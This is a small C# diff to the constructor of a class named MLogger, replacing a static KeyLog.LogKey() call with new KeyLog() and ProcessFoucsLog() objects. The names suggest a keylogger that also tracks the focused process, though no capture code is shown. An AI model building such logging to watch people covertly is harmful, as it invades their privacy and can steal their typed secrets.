@@ -10,7 +10,8 @@ namespace MLogger
     {
         public MLogger()
         {
-            KeyLog.LogKey();
+            new KeyLog();
+            new ProcessFoucsLog();
         }
     }
 }
